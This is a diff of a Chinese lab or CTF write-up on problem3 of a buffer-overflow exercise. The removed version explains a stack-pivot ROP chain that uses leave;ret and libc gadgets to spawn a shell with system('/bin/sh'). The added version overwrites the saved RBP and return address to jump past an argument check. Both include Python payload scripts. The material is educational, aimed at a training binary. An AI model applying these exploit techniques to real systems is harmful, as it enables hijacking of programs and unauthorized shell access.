@@ -66,43 +66,36 @@ sys.stdout.buffer.write(payload)
 
 ![alt text](image-1.png)
 
-问题3：极限操作 - 栈迁移与ROP的雏形
 
-problem3 将难度提升到了一个新的层次。分析发现，虽然存在溢出，但从缓冲区末端到返回地址之间的可控空间极其有限（仅24字节），不足以容纳一个完整的ROP链，更不用说Shellcode。直接攻击的道路被堵死了，这迫使我们必须采用一种更为精妙的技术——“Stack Pivot”（栈迁移）。
+问题3：精准跳转 - 绕过函数检查
 
-这种技术的思想核心是：既然溢出区域空间狭小，我们就把真正的、更长的攻击代码（ROP链）放置在空间充裕的缓冲区起始位置。然后，利用这有限的溢出空间，精心构造一个微小的payload，其目标不是直接获取Shell，而是劫持栈指针（RSP），使其指向我们布置好的缓冲区。我们通过覆盖返回地址为程序中存在的 leave; ret 指令序列（Gadget）来实现这一目标。leave 指令（等效于 mov rsp, rbp; pop rbp）是实现栈迁移的关键。通过精确伪造保存在栈上的旧RBP值，让它指向我们缓冲区的起始地址（减8字节），leave 指令执行后，RSP就神奇地“迁移”到了我们完全掌控的内存区域。随后，ret 指令会从新的栈顶弹出我们ROP链的第一个地址，从而开启真正的攻击序列。在这个挑战中，由于ASLR已被我们手动关闭，我们可以直接使用在 problem4 中获得的、位于 libc 中的 system 等函数地址，构建一个直接调用 system("/bin/sh") 的ROP链。
+problem3将挑战的性质从“注入代码”转变为“在极度受限的条件下操控程序逻辑”。通过对该程序的反汇编分析，我们发现其漏洞核心在于func函数中的一次memcpy操作，它将多达64字节的数据复制到一个仅有32字节的栈缓冲区中。这为我们提供了32字节的溢出空间，足以覆盖保存的rbp指针和函数返回地址。
+
+然而，本题的目标是让程序打印出“你的幸运数字是114！”。这段逻辑位于func1函数内，但func1的入口处设有一个检查，要求其接收的第一个参数必须是114（0x72）。在有限的溢出空间内构造一个既能传递参数又能调用函数的ROP链是相当复杂的。幸运的是，通过仔细观察func1的汇编代码，我们发现了一条捷径：负责打印成功信息的代码块位于参数检查指令之后。
+
+因此，我们制定了一个更为优雅的攻击策略：直接将返回地址覆盖为打印成功信息代码块的第一条指令地址（0x40122b），从而完全绕过参数检查。这个方案还有一个微妙的细节需要处理：func1内部的代码使用了基于rbp的相对寻址来写入数据。当func函数返回前执行leave指令时，它会从我们溢出的数据中弹出一个值到rbp寄存器。如果这个值是无效地址（如AAAA...），func1内部的写操作就会引发段错误。为了确保程序稳定执行，我们必须在覆盖返回地址的同时，将保存的rbp值覆盖为一个可写的内存地址（例如，数据段中的0x403800），充当一个安全的“伪造RBP”。这样，我们的攻击payload不仅劫持了程序的执行流，还为后续代码的正常运行铺平了道路。
 
 解决方案 Payload 代码：
 # solve3.py
-from pwn import *
+import struct
 
-context.arch = 'amd64' # 明确指定64位架构
+# 偏移量：32字节缓冲区
+padding = b'A' * 32
 
-# GDB中获得的缓冲区地址
-BUFFER_ADDR = 0x7fffffffd780 
-# 关闭ASLR后，从libc获取的固定地址和偏移
-LIBC_BASE = 0x7ffff7c00000
-POP_RDI   = LIBC_BASE + 0x10f78b
-SYSTEM    = LIBC_BASE + 0x58750
-BIN_SH    = LIBC_BASE + 0x1cb42f
-RET       = 0x40101a # 用于栈对齐
-LEAVE_RET = 0x4013a6 # 栈迁移的关键Gadget
+# 1. 伪造 RBP，指向一个可写的内存区域，防止 func1 内部写操作崩溃
+fake_rbp = struct.pack('<Q', 0x403800)
 
-# 放置在缓冲区头部的真正ROP链
-real_chain = flat([RET, POP_RDI, BIN_SH, SYSTEM])
-# 伪造RBP，使其指向缓冲区地址-8
-fake_rbp = BUFFER_ADDR - 8
-# 最终Payload: [ROP链] + [伪造的RBP] + [指向leave;ret的返回地址]
-payload = real_chain + p64(fake_rbp) + p64(LEAVE_RET)
+# 2. 覆盖返回地址，直接跳到 func1 内部跳过检查的地址
+target_addr = struct.pack('<Q', 0x40122b)
 
+# 最终Payload: [填充] + [伪造的RBP] + [劫持的返回地址]
+payload = padding + fake_rbp + target_addr
+
+# 将Payload写入文件
 with open("ans3.txt", "wb") as f:
     f.write(payload)
 
-
-结果：
-尽管溢出空间极为有限，但通过精巧的栈迁移技术，我们成功执行了位于缓冲区的ROP链，最终获取了系统的Shell。
-
-![alt text](image-2.png)
+![alt text](image-4.png)
 
 问题4：挑战现代防御 - 返回导向编程（ROP）
 
